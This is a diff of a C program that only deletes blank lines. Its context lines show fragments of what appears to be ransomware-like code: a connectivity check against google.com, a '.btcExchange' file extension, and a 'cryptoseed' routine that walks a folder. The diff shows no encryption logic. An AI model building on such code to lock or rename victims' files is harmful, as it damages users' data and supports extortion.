@@ -30,7 +30,6 @@ void copyFile(const char* sourcePath, const char* destinationPath) {
     fclose(destinationFile);
 }
 
-
 int main() {
     const char *hostname = "google.com";
     struct addrinfo hints, *res;
@@ -77,7 +76,6 @@ int main() {
 
     const char* ExtensionChange = ".btcExchange";
     
-
     cryptoseed(fullPath, ExtensionChange);
 
     return 0;
@@ -124,6 +122,5 @@ void cryptoseed(const char* folderPath, const char* ExtensionChange) {
             }
         }
     }
-
     closedir(directory);
 }
